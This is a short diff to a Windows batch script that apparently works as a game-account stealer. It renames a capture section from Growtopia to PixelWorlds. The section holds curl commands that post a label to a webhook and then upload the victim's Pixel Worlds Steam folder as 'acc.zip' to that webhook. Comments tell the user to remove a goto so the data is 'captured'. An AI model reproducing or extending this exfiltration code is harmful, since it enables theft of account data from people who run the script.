@@ -234,14 +234,14 @@ goto skipminecraft
 	timeout /t 2 /nobreak > NUL
 :skipminecraft
 
-:: GROWTOPIA - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
+:: pixelworlds - REMOVE THE GOTO IF YOU WANT IT TO BE CAPTURED
 :: ---------------------------------------------------------
-goto skipgrowtopia
-	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- GROWTOPIA -```\"}"  %webhook%
+goto skippixelworlds
+	curl --silent --output /dev/null -i -H "Accept: application/json" -H "Content-Type:application/json" -X POST --data "{\"content\": \"```- PixelWorlds -```\"}"  %webhook%
 	curl --silent --output /dev/null -F acc.zip=@"C:\Program Files (x86)\Steam\steamapps\common\Pixel Worlds" %webhook%
 	
 	timeout /t 2 /nobreak > NUL
-:skipgrowtopia
+:skippixelworlds
 
 :: OTHER
 :: -----
